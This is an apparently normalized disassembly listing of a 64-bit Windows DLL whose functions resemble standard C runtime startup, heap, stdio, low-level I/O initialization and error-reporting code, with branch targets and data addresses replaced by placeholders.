lea rcx [ rsi + 0x8 ]
call sub_18000a180
mov [ rw-data ] rax
jmp r-xdata
mov edx 0x1000
cmp rax rdx
cmovb rdx rax
add rdx rax
cmp rdx rax
jb r-xdata
call sub_1800094b0
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
lea rdx [ r12 + 0x20 ]
cmp rdx r12
jb r-xdata
mov rcx r13
call sub_180008900
test rax rax
jne r-xdata
xor ebx ebx
jmp r-xdata
mov rcx r13
call sub_180008900
test rax rax
je r-xdata
sar rdi 0x3
lea rsi [ rax + rdi * 8 ]
mov rcx rax
call sub_18000a180
mov [ rw-data ] rax
jmp r-xdata
sub_180008230
push rbx
sub rsp 0x20
cmp edx 0x1
mov rbx r8
jne r-xdata
test edx edx
jne r-xdata
call [ GetProcessHeap@IAT ]
xor edx edx
mov r8d 0x94
mov rcx rax
call [ HeapAlloc@IAT ]
test rax rax
mov rbx rax
je r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
mov rcx rax
mov [ rax ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
cmp edx 0x3
jne r-xdata
call sub_18000a410
mov edx 0x2d8
mov ecx 0x1
call sub_180008870
test rax rax
mov rbx rax
je r-xdata
sub eax 0x1
cmp [ rw-data ] edx
mov [ rw-data ] eax
jne r-xdata
mov [ rsp + 0x30 ] rbp
mov ebp [ rbx + 0x8 ]
mov [ rsp + 0x38 ] rsi
mov esi [ rbx + 0x4 ]
mov [ rsp + 0x40 ] rdi
mov edi [ rbx + 0xc ]
mov [ rsp + 0x48 ] r12
mov r12d [ rbx + 0x10 ]
and edi 0x7fff
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
cmp r12d 0x2
je r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
mov eax 0x1
add rsp 0x20
pop rbx
retn
xor ecx ecx
call sub_18000a8a0
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
test rbx rbx
jne r-xdata
call sub_1800097c0
mov eax esi
mov ecx 0x1
mov [ rw-data ] r12d
shl eax 0x8
mov [ rw-data ] esi
mov [ rw-data ] ebp
add eax ebp
mov [ rw-data ] edi
mov [ rw-data ] eax
call sub_18000c8e0
mov r12 [ rsp + 0x48 ]
test eax eax
mov rdi [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
mov rbp [ rsp + 0x30 ]
je r-xdata
bts edi 0xf
mov rcx rbx
call sub_1800085f0
xor eax eax
add rsp 0x20
pop rbx
retn
xor edx edx
mov rcx rbx
call sub_18000a470
call [ GetCurrentThreadId@IAT ]
mov [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov eax 0x1
add rsp 0x20
pop rbx
retn
call sub_1800092b0
call sub_18000a420
call sub_18000c940
lea eax [ rbx + 0x1 ]
add rsp 0x20
pop rbx
retn
call sub_18000a900
test eax eax
je r-xdata
call sub_18000c940
xor eax eax
add rsp 0x20
pop rbx
retn
call sub_18000e7b0
call [ GetCommandLineA@IAT ]
mov [ rw-data ] rax
call sub_18000e5e0
mov [ rw-data ] rax
call sub_180008f70
test eax eax
js r-xdata
call sub_18000a420
call sub_18000e4d0
test eax eax
js r-xdata
call sub_1800092b0
call sub_18000e140
test eax eax
js r-xdata
xor ecx ecx
call sub_1800095a0
test eax eax
jne r-xdata
add [ rw-data ] 0x1
mov eax 0x1
add rsp 0x20
pop rbx
retn
sub_180008470
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
mov rsi r8
mov edi edx
mov r12 rcx
mov eax 0x1
test edx edx
jne r-xdata
cmp edx 0x1
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov r9 [ r--data ]
test r9 r9
je r-xdata
cmp edx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
call r9
mov [ rsp + 0x20 ] eax
mov r8 rsi
mov edx edi
mov rcx r12
call sub_180004c80
mov ebx eax
mov [ rsp + 0x20 ] eax
cmp edi 0x1
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
test eax eax
je r-xdata
mov r8 rsi
mov edx edi
mov rcx r12
call sub_180008230
mov [ rsp + 0x20 ] eax
test edi edi
je r-xdata
test eax eax
jne r-xdata
mov r8 rsi
mov edx edi
mov rcx r12
call sub_180008230
test eax eax
jne r-xdata
cmp edi 0x3
jne r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call sub_180004c80
mov r8 rsi
xor edx edx
mov rcx r12
call sub_180008230
mov r11 [ r--data ]
test r11 r11
je r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov [ rsp + 0x20 ] ebx
jmp r-xdata
mov eax ebx
jmp r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call r11
mov rax [ r--data ]
test rax rax
je r-xdata
mov r8 rsi
mov edx edi
mov rcx r12
call rax
mov ebx eax
mov [ rsp + 0x20 ] eax
_start
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
cmp edx 0x1
mov rdi r8
mov ebx edx
mov rsi rcx
jne r-xdata
mov r8 rdi
mov edx ebx
mov rcx rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_180008470
call sub_18000ea60
sub_1800085f0
sub rsp 0x28
test rcx rcx
je r-xdata
add rsp 0x28
retn
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
mov [ rsp + 0x20 ] rbx
call sub_180008e80
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180008e30
mov [ rbx ] eax
mov rbx [ rsp + 0x20 ]
sub_180008640
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r14 [ r9 + 0x8 ]
mov rbp [ r9 ]
mov r13 [ r9 + 0x38 ]
sub rbp r14
xor edi edi
test [ rcx + 0x4 ] 0x66
mov r15 r9
mov rsi rdx
mov r12 rcx
jne r-xdata
mov rsi [ r9 + 0x20 ]
sub rsi r14
cmp [ r13 ] edi
jbe r-xdata
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x38 ] r8
cmp [ r13 ] edi
jbe r-xdata
mov eax 0x1
lea rbx [ r13 + 0x10 ]
nop
nop
lea rbx [ r13 + 0xc ]
nop
add edi 0x1
add rbx 0x10
cmp edi [ r13 ]
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp rbp rax
jae r-xdata
add edi 0x1
add rbx 0x10
cmp edi [ r13 ]
jb r-xdata
mov eax [ rbx - 0x4 ]
cmp rbp rax
jae r-xdata
mov ecx [ rbx - 0xc ]
cmp rbp rcx
jb r-xdata
cmp rsi rcx
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp rbp rax
jb r-xdata
jmp r-xdata
cmp [ rbx + 0x4 ] 0x0
je r-xdata
mov ecx [ rbx ]
test ecx ecx
je r-xdata
cmp rsi rax
ja r-xdata
mov eax [ rbx ]
cmp eax 0x1
je r-xdata
mov rdx [ rsp + 0x78 ]
add rax r14
mov cl 0x1
mov [ r15 ] rax
mov r8d [ rbx - 0x4 ]
add r8 r14
call r8
cmp rsi rcx
je r-xdata
test [ r12 + 0x4 ] 0x20
jne r-xdata
cmp [ r12 ] 0xe06d7363
jne r-xdata
lea rcx [ rsp + 0x30 ]
add rax r14
mov rdx rsi
call rax
test eax eax
js r-xdata
jmp r-xdata
mov ecx [ rbx + 0x4 ]
mov r8d 0x1
mov rdx rsi
add rcx r14
call sub_18000eb60
mov rax [ r15 + 0x40 ]
mov edx [ rbx + 0x4 ]
movsxd r9 [ r12 ]
mov [ rsp + 0x28 ] rax
mov rax [ r15 + 0x28 ]
add rdx r14
mov r8 r12
mov rcx rsi
mov [ rsp + 0x20 ] rax
call [ RtlUnwindEx@IAT ]
call sub_18000eb90
cmp [ r--data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
jle r-xdata
lea rcx [ r--data ]
call sub_18000ec20
test eax eax
je r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x1
mov rcx r12
call [ r--data ]
sub_180008800
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor edi edi
mov rsi rcx
or ebp 0xffffffff
nop
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi ebp
cmp edi ebp
jne r-xdata
mov rcx rsi
call sub_180007310
test rax rax
mov rbx rax
jne r-xdata
mov rax rbx
sub_180008870
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rsi rdx
mov rbp rcx
or r12d 0xffffffff
nop
nop
nop
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi r12d
cmp edi r12d
jne r-xdata
xor r8d r8d
mov rdx rsi
mov rcx rbp
call sub_18000ec90
test rax rax
mov rbx rax
jne r-xdata
mov rax rbx
sub_180008900
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbp rcx
or r12d 0xffffffff
nop
nop
nop
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r12d
cmp esi r12d
jne r-xdata
mov rdx rdi
mov rcx rbp
call sub_18000ed60
test rax rax
mov rbx rax
jne r-xdata
mov rax rbx
sub_180008990
push rbx
sub rsp 0x20
mov eax [ rcx + 0x18 ]
mov rbx rcx
test al 0x83
je r-xdata
add rsp 0x20
pop rbx
retn
test al 0x8
je r-xdata
mov rcx [ rcx + 0x10 ]
call sub_1800085f0
and [ rbx + 0x18 ] 0xfffffbf7
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x8 ] eax
sub_1800089d0
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rbx rcx
mov ecx [ rcx + 0x18 ]
xor esi esi
mov eax ecx
and al 0x3
cmp al 0x2
jne r-xdata
mov rcx [ rbx + 0x10 ]
mov [ rbx + 0x8 ] 0x0
mov eax esi
mov [ rbx ] rcx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
test ecx 0x108
je r-xdata
mov [ rsp + 0x30 ] rdi
mov edi [ rbx ]
sub edi [ rbx + 0x10 ]
test edi edi
jle r-xdata
mov rdi [ rsp + 0x30 ]
mov rcx rbx
call sub_18000f7b0
mov rdx [ rbx + 0x10 ]
mov r8d edi
mov ecx eax
call sub_18000f660
cmp eax edi
jne r-xdata
or [ rbx + 0x18 ] 0x20
or esi 0xffffffff
mov eax [ rbx + 0x18 ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ rbx + 0x18 ] eax
jmp r-xdata
sub_180008a50
push rbx
sub rsp 0x20
test rcx rcx
mov rbx rcx
jne r-xdata
mov ecx [ rcx + 0x18 ]
mov [ rsp + 0x30 ] rsi
xor esi esi
mov eax ecx
and al 0x3
cmp al 0x2
jne r-xdata
add rsp 0x20
pop rbx
jmp sub_180008b10
mov rcx [ rbx + 0x10 ]
test esi esi
mov rsi [ rsp + 0x30 ]
mov [ rbx ] rcx
mov [ rbx + 0x8 ] 0x0
je r-xdata
test ecx 0x108
je r-xdata
bt [ rbx + 0x18 ] 0xe
jae r-xdata
or eax 0xffffffff
add rsp 0x20
pop rbx
retn
mov [ rsp + 0x38 ] rdi
mov edi [ rbx ]
sub edi [ rbx + 0x10 ]
test edi edi
jle r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
mov rcx rbx
call sub_18000f7b0
mov ecx eax
call sub_18000f7f0
neg eax
sbb eax eax
add rsp 0x20
pop rbx
retn
mov rdi [ rsp + 0x38 ]
mov rcx rbx
call sub_18000f7b0
mov rdx [ rbx + 0x10 ]
mov r8d edi
mov ecx eax
call sub_18000f660
cmp eax edi
jne r-xdata
or [ rbx + 0x18 ] 0x20
or esi 0xffffffff
mov eax [ rbx + 0x18 ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ rbx + 0x18 ] eax
jmp r-xdata
sub_180008b10
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov r12d ecx
xor edi edi
mov r13d edi
lea ecx [ rdi + 0x1 ]
call sub_180009ab0
nop
mov ebx edi
mov [ rsp + 0x20 ] ebx
or r14d 0xffffffff
mov ecx 0x1
call sub_180009980
cmp r12d 0x1
cmove r13d edi
mov eax r13d
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
movsxd rsi ebx
mov rax [ rw-data ]
cmp [ rax + rsi * 8 ] 0x0
je r-xdata
add ebx 0x1
mov [ rsp + 0x20 ] ebx
jmp r-xdata
mov rdx [ rax + rsi * 8 ]
test [ rdx + 0x18 ] 0x83
je r-xdata
cmp ebx [ rw-data ]
jge r-xdata
mov ecx ebx
call sub_180005e00
nop
mov rax [ rw-data ]
mov rcx [ rax + rsi * 8 ]
mov eax [ rcx + 0x18 ]
test al 0x83
je r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + rsi * 8 ]
mov ecx ebx
call sub_180005e90
cmp r12d 0x1
jne r-xdata
test r12d r12d
jne r-xdata
call sub_180008a50
cmp eax 0xffffffff
je r-xdata
test al 0x2
je r-xdata
add edi r12d
mov [ rsp + 0x24 ] edi
jmp r-xdata
call sub_180008a50
cmp eax 0xffffffff
cmove r13d r14d
mov [ rsp + 0x28 ] r13d
sub_180008c80
push rbx
sub rsp 0x5a0
lea rcx [ rsp + 0xd0 ]
call [ RtlCaptureContext@IAT ]
lea rcx [ rsp + 0x30 ]
xor edx edx
mov r8d 0x98
call sub_1800059c0
mov rax [ rsp + 0x5a8 ]
mov [ rsp + 0x30 ] 0xc000000d
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
lea rax [ rsp + 0xd0 ]
mov [ rsp + 0x28 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x20 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc000000d
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x5a0
pop rbx
retn
test ebx ebx
jne r-xdata
lea ecx [ rax + 0x2 ]
call sub_18000f930
sub_180008d20
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x5b0
mov rbp rcx
mov rcx [ rw-data ]
mov ebx r9d
mov rdi r8
mov rsi rdx
call sub_18000a340
test rax rax
je r-xdata
mov ecx 0x2
call sub_18000f930
lea rcx [ rsp + 0xe0 ]
call [ RtlCaptureContext@IAT ]
lea rcx [ rsp + 0x40 ]
xor edx edx
mov r8d 0x98
call sub_1800059c0
mov rax [ rsp + 0x5b8 ]
mov [ rsp + 0x40 ] 0xc000000d
mov [ rsp + 0x50 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0xe0 ]
mov [ rsp + 0x38 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x30 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
mov r10 [ rsp + 0x5e0 ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
mov [ rsp + 0x20 ] r10
call rax
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc000000d
mov rcx rax
call [ TerminateProcess@IAT ]
test ebx ebx
jne r-xdata
lea r11 [ rsp + 0x5b0 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
lea ecx [ rax + 0x2 ]
call sub_18000f930
sub_180008e30
lea r8 [ rw-data ]
xor edx edx
mov rax r8
nop
movsxd rax edx
mov eax [ r8 + rax * 8 + 0x4 ]
retn
add edx 0x1
add rax 0x8
cmp edx 0x2d
jb r-xdata
cmp ecx [ rax ]
je r-xdata
lea eax [ rcx - 0x13 ]
cmp eax 0x11
ja r-xdata
add ecx 0xffffff44
mov eax 0x16
mov edx 0x8
cmp ecx 0xe
cmovbe eax edx
retn
mov eax 0xd
retn
sub_180008ee0
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18000a600
test rax rax
jne r-xdata
add rax 0x14
lea rax [ rw-data ]
jmp r-xdata
movsxd rax ecx
mov ebx [ rdx + rax * 8 + 0x4 ]
add ecx 0x1
add rax 0x8
cmp ecx 0x2d
jb r-xdata
lea rdx [ rw-data ]
mov [ rax ] ebx
xor ecx ecx
mov rax rdx
nop
mov [ rax + 0x10 ] ebx
add rsp 0x20
pop rbx
retn
mov [ rw-data ] ebx
add rsp 0x20
pop rbx
retn
cmp ebx [ rax ]
je r-xdata
lea eax [ rbx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ rbx - 0xbc ]
mov ecx 0x8
mov ebx 0x16
cmp eax 0xe
cmovbe ebx ecx
jmp r-xdata
mov ebx 0xd
jmp r-xdata
call sub_18000a600
test rax rax
jne r-xdata
sub_180008f70
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
mov [ rsp + 0x20 ] r12
push r13
push r14
push r15
sub rsp 0x90
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoA@IAT ]
nop
mov edx 0x58
lea ecx [ rdx - 0x38 ]
call sub_180008870
mov r11 rax
test rax rax
jne r-xdata
mov [ rw-data ] rax
mov ecx 0x20
mov [ rw-data ] ecx
add rax 0xb00
cmp r11 rax
jae r-xdata
or eax 0xffffffff
jmp r-xdata
xor edi edi
xor edi edi
nop
nop
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r14
pop r13
retn
mov r13d edi
mov rsi rdi
mov r14 [ rsp + 0x68 ]
test r14 r14
je r-xdata
mov [ r11 + 0x8 ] dil
mov [ r11 ] 0xffffffffffffffff
mov [ r11 + 0x9 ] 0xa
mov [ r11 + 0xc ] edi
mov [ r11 + 0x38 ] dil
mov [ r11 + 0x39 ] 0xa
mov [ r11 + 0x3a ] 0xa
mov [ r11 + 0x50 ] edi
mov [ r11 + 0x4c ] dil
add r11 0x58
mov rax [ rw-data ]
add rax 0xb00
cmp r11 rax
jb r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov [ rbx + 0x8 ] 0x81
test rsi rsi
jne r-xdata
cmp rax 0xfffffffffffffffe
je r-xdata
movsxd rax [ r14 ]
add r14 0x4
lea r13 [ r14 + rax ]
mov r15d 0x800
cmp eax r15d
cmovl r15d eax
mov ebx 0x1
cmp ecx r15d
jge r-xdata
cmp [ rsp + 0x62 ] 0x0
je r-xdata
mov ecx edi
cmp r13d 0x1
sete cl
add ecx 0xfffffff4
mov ecx 0xfffffff6
jmp r-xdata
or [ rbx + 0x8 ] 0x80
jmp r-xdata
lea r12 [ rw-data ]
lea r12 [ rw-data ]
or [ rbx + 0x8 ] 0x40
mov [ rbx ] 0xfffffffffffffffe
test rax rax
je r-xdata
call [ GetStdHandle@IAT ]
mov r12 rax
cmp rax 0xffffffffffffffff
je r-xdata
add r13d 0x1
add rsi 0x1
cmp rsi 0x3
jl r-xdata
mov rcx [ r13 ]
cmp rcx 0xffffffffffffffff
je r-xdata
mov r15d [ rw-data ]
jmp r-xdata
mov [ r12 + rbx * 8 ] rax
mov eax [ rw-data ]
add eax 0x20
mov [ rw-data ] eax
lea rcx [ r11 + 0xb00 ]
cmp r11 rcx
jae r-xdata
mov rbx rsi
imul rbx rbx 0x58
add rbx [ rw-data ]
mov rax [ rbx ]
cmp rax 0xffffffffffffffff
je r-xdata
mov ecx [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
mov rcx rax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
add ebx 0x1
add r14 0x1
add r13 0x8
cmp ebx r15d
jl r-xdata
cmp rcx 0xfffffffffffffffe
je r-xdata
mov ebx edi
test r15d r15d
jle r-xdata
add rbx 0x1
cmp eax r15d
jl r-xdata
nop
nop
nop
mov [ rbx ] r12
movzx eax al
cmp eax 0x2
jne r-xdata
movzx eax [ r14 ]
test al 0x1
je r-xdata
mov edx 0x58
lea ecx [ rdx - 0x38 ]
call sub_180008870
mov r11 rax
test rax rax
je r-xdata
jmp r-xdata
mov [ r11 + 0x8 ] 0x0
mov [ r11 ] 0xffffffffffffffff
mov [ r11 + 0x9 ] 0xa
mov [ r11 + 0xc ] edi
and [ r11 + 0x38 ] 0x80
mov [ r11 + 0x39 ] 0xa
mov [ r11 + 0x3a ] 0xa
mov [ r11 + 0x50 ] edi
mov [ r11 + 0x4c ] 0x0
add r11 0x58
mov rax [ r12 + rbx * 8 ]
add rax 0xb00
cmp r11 rax
jb r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
or [ rbx + 0x8 ] 0x40
jmp r-xdata
test al 0x8
jne r-xdata
lea rcx [ rbx + 0x10 ]
mov edx 0xfa0
call sub_180009cd0
test eax eax
je r-xdata
or [ rbx + 0x8 ] 0x8
movsxd rax ebx
mov rcx rax
sar rcx 0x5
mov sil al
and esi 0x1f
imul rsi rsi 0x58
add rsi [ r12 + rcx * 8 ]
mov rax [ r13 ]
mov [ rsi ] rax
movzx eax [ r14 ]
mov [ rsi + 0x8 ] al
lea rcx [ rsi + 0x10 ]
mov edx 0xfa0
call sub_180009cd0
test eax eax
je r-xdata
call [ GetFileType@IAT ]
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
add [ rbx + 0xc ] 0x1
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
add [ rsi + 0xc ] 0x1
jmp r-xdata
sub_1800092b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rdi [ rw-data ]
xor esi esi
lea rbp [ rw-data ]
add rdi 0x8
cmp rdi rbp
jl r-xdata
lea rax [ rbx + 0xb00 ]
cmp rbx rax
jae r-xdata
mov rbx [ rdi ]
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rdi ]
call sub_1800085f0
mov [ rdi ] rsi
cmp [ rbx + 0xc ] esi
je r-xdata
mov rax [ rdi ]
add rbx 0x58
add rax 0xb00
cmp rbx rax
jb r-xdata
lea rcx [ rbx + 0x10 ]
call [ DeleteCriticalSection@IAT ]
sub_180009340
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
xor r12d r12d
mov edi r12d
lea ecx [ r12 + 0x1 ]
call sub_180009ab0
nop
mov ebx 0x3
mov [ rsp + 0x20 ] ebx
nop
mov ecx 0x1
call sub_180009980
mov eax edi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
movsxd rsi ebx
mov rax [ rw-data ]
cmp [ rax + rsi * 8 ] 0x0
je r-xdata
add ebx 0x1
mov [ rsp + 0x20 ] ebx
jmp r-xdata
mov rcx [ rax + rsi * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x14
jl r-xdata
call sub_18000f9e0
cmp eax 0xffffffff
je r-xdata
mov rax [ rw-data ]
mov rcx [ rax + rsi * 8 ]
add rcx 0x30
call [ DeleteCriticalSection@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + rsi * 8 ]
call sub_1800085f0
mov r11 [ rw-data ]
mov [ r11 + rsi * 8 ] r12
add edi 0x1
mov [ rsp + 0x24 ] edi
sub_180009460
push rbx
sub rsp 0x20
mov ebx ecx
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call [ ExitProcess@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call rax
sub_1800094c0
cmp rcx rdx
jae r-xdata
retn 0x0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_180009500
sub rsp 0x38
test rcx rcx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
mov eax 0x16
add rsp 0x38
retn
mov [ rcx ] eax
xor eax eax
add rsp 0x38
retn
sub_180009550
sub rsp 0x38
test rcx rcx
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
mov eax 0x16
add rsp 0x38
retn
mov eax [ rw-data ]
mov [ rcx ] eax
xor eax eax
add rsp 0x38
retn
sub_1800095a0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rw-data ] 0x0
mov ebx ecx
je r-xdata
call sub_18000fa80
lea rbx [ r--data ]
lea rdi [ r--data ]
xor eax eax
cmp rbx rdi
jae r-xdata
lea rcx [ rw-data ]
call sub_18000ec20
test eax eax
je r-xdata
lea rcx [ sub_18000e7f0 ]
call sub_180008210
lea rbx [ r--data ]
lea rdi [ r--data ]
cmp rbx rdi
jae r-xdata
test eax eax
jne r-xdata
mov ecx ebx
call [ rw-data ]
cmp [ rw-data ] 0x0
je r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx ]
test rcx rcx
je r-xdata
xor eax eax
lea rcx [ rw-data ]
call sub_18000ec20
test eax eax
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rcx
xor r8d r8d
xor ecx ecx
lea edx [ r8 + 0x2 ]
call [ rw-data ]
test eax eax
jne r-xdata
sub_180009670
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
sub rsp 0x30
mov r12d r8d
mov ebx edx
mov r13d ecx
mov ecx 0x8
call sub_180009ab0
nop
cmp [ rw-data ] 0x1
je r-xdata
test r12d r12d
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] r12b
test ebx ebx
jne r-xdata
test r12d r12d
jne r-xdata
mov ecx 0x8
call sub_180009980
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_1800094c0
nop
mov rcx [ rw-data ]
call sub_18000a340
mov rsi rax
mov rcx [ rw-data ]
call sub_18000a340
mov rbx rax
mov [ rsp + 0x20 ] rax
test rsi rsi
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
